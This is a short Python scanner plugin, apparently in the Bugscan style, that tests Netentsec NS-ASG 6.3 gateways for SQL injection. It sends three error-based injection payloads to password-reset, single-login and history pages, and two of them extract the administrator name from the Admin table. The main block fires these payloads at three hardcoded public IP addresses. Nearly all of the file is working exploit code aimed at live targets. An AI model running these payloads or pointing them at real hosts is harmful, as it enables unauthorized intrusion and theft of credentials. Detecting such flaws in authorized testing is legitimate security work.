#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:网康科技应用网关NS—ASG 6.3通用性sql注入打包
#Refer:http://www.wooyun.org/bugs/wooyun-2014-073991


def assign(service,arg):
    if service=="nsasg":
        return True,arg 
    


def  audit(arg):
    ps = [
        
        "vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x1,%20(select%20md5(1))))",
        "WebPages/singlelogin.php?loginId=1 %20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20md5(1))%20from%20Admin%20limit%201)))%20%23&submit=t",
        
        "WebPages/history.php?uid=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20md5(1))%20from%20Admin%20limit%201)))",
        ]
    for p in ps:
        url=arg+p
        code, head, res, errcode, _ = curl.curl2(url)
        if code==200 and "c4ca4238a0b923820dcc" in res:
            security_hole('SQL injection:'+url)  

if __name__=="__main__":
    from dummy import *
    audit(assign('nsasg','https://211.82.48.60/')[1])
    audit(assign('nsasg','https://125.219.33.245/')[1])
    audit(assign('nsasg','https://202.196.119.130/')[1])